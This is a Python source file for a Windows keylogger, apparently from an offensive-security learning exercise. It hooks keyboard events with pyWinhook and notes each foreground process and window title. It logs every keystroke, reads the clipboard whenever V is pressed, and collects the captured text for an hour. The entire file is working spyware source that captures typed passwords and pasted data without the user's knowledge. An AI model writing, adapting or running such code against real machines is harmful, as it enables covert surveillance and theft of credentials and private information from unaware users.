from ctypes import byref, create_string_buffer,  c_ulong, windll
from io import StringIO

import pythoncom
import pyWinhook as pyHook
import sys
import time
import win32clipboard


TIMEOUT = 60 * 60

class KeyLogger:
    def __init__(self):
        self.current_window = None

    def get_current_process(self):
        hwnd = windll.user32.GetForegroundWindow()
        pid = c_ulong(0)
        windll.user32.GetWindowThreadProcessId(hwnd, byref(pid))
        process_id = f'{pid.value}'

        executable = create_string_buffer(b'\x00' * 512)
        h_process = windll.kernel32.OpenProcess(
            0x400 | 0x10, False, pid)
        windll.psapi.GetModuleBaseNameA(
            h_process, None, byref(executable), 512)
        window_title = create_string_buffer(b'\x00' * 512)
        length = windll.user32.GetWindowTextA(hwnd, byref(window_title), 512)

        # print out the header if we're in the right process
        print()
        print("[ PID: %s - %s - %s ]" % (process_id,
                                         executable.value,
                                         window_title.value)
              )
        print()

        windll.kernel32.CloseHandle(hwnd)
        windll.kernel32.CloseHandle(h_process)

    def keystroke(self, event):
        '''self.current_window
        if event.WindowName != self.current_window:
            self.get_current_process()
        #self.current_windowpoky'''

        # check to see if target changed windows
        if event.WindowName != self.current_window:
            self.current_window = event.WindowName
            self.get_current_process()

        if 32 < event.Ascii < 127:
            print(chr(event.Ascii), end=' ')
        else:
            if event.Key == 'V':
                win32clipboard.OpenClipboard()
                value = win32clipboard.GetClipboardData()
                win32clipboard.CloseClipboard()
                print(f'[PASTE] - {value}')
            else:
                print(f'{event.Key}', end=' ')
        return True

def run():
    save_stdout = sys.stdout
    sys.stdout = StringIO()

    kl = KeyLogger()
    hm = pyHook.HookManager()
    hm.KeyDown = kl.keystroke
    hm.HookKeyboard()
    while time.thread_time() < TIMEOUT:
        pythoncom.PumpWaitingMessages()

    log = sys.stdout.getvalue()
    sys.stdout = save_stdout

    return log


if __name__ == '__main__':
    print(run())
    print('done.')
